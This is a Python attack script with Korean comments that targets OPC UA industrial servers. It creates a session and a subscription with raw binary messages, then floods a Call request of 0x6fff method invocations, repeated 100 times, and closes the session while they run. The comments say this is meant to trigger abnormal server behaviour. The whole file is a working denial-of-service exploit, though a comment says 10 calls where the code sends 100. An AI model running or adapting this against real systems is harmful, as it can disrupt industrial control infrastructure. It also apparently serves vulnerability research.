import datetime

from protocol import *  # OPC UA 프로토콜 관련된 모듈
from config import *  # 설정값을 포함하는 모듈

# attack 함수는 서버에 여러 OPC UA 메서드를 호출한 후 세션을 종료하여 비정상적인 동작을 유발하는 공격입니다.
# server_details: 서버 세부 정보 (프로그램 타입, IP 주소, 포트 등)
def attack(server_details):
    program_type, ip_addr, port, query_string = server_details

    # OPC UA 세션 생성
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.session_timeout = 4294967295  # 세션 타임아웃 설정
    opcua.create_session()  # 세션 생성

    ### 구독 추가 요청 ###
    message_header = opcua.build_opcua_message_header()  # OPC UA 메시지 헤더 생성
    message_body = b""
    message_body += b"\x01\x00"  # Expanded Node ID 타입 (네임스페이스 인덱스 0)
    message_body += b"\x13\x03"  # Create Subscription 요청 타입
    message_body += OBJECT.build(opcua.auth_id)  # 인증 토큰 추가
    create_subscription_body = bytes.fromhex("81f893276ce7d7014e000000ff030000ffffffff000000000000000000000000408f40e80300000a0000000000000001ff")
    message = message_header + message_body + create_subscription_body

    print("[-] Sending MSG Request - CreateSubscription")
    create_sub_response = opcua.send_recv(message, should_recv=True)  # 구독 요청 전송 및 응답 수신
    subscription_id = create_sub_response[-20: -16]  # 응답에서 구독 ID 추출
    print(f"[-] Created Subscription with id {subscription_id}")

    ### 메서드 호출 요청 ###
    message_header = opcua.build_opcua_message_header()  # 새로운 요청의 메시지 헤더 생성
    message_body = b""
    message_body += b"\x01\x00"  # Expanded Node ID 타입
    message_body += b"\xc8\x02"  # Call 요청 타입
    message_body += OBJECT.build(opcua.auth_id)  # 인증 토큰 추가
    message_body += bytes.fromhex("f0ad852791f1d70142460f0000000000ffffffff10270000000000")

    # 다수의 메서드 호출 생성
    number_of_methods = 0x6fff  # 호출할 메서드 수 설정
    method = bytes.fromhex("0100cd080100e42c0100000007") + subscription_id  # 메서드 호출 구조
    methods = struct.pack("I", number_of_methods) + (method * number_of_methods)  # 메서드들을 모두 묶어서 전송할 데이터 생성

    message = message_header + message_body + methods
    print("[-] Sending MSG Request - Call")

    ############################## !!!! ##############################
    # 10번 호출을 보내면서 세션을 닫음. 메서드 실행 중 세션이 종료되면 비정상적인 동작을 유발할 수 있음.
    opcua.send_recv(message, count=100, should_recv=False)
    ##################################################################

    # 세션 종료
    opcua.close()  # 세션을 닫아 비정상적인 동작을 유도
